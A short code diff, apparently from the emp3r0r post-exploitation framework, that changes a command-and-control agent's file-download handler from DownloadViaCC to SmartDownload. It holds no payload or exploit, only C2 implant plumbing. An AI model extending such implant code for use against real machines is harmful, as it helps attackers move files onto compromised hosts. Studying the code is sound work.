@@ -241,7 +241,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			out = fmt.Sprintf("args error: %v", cmdSlice)
 			return
 		}
-		_, err = DownloadViaCC(*file_to_download, *path)
+		_, err = SmartDownload(*file_to_download, *path)
 		if err != nil {
 			out = fmt.Sprintf("processCCData: cant download %s: %v", *file_to_download, err)
 			return
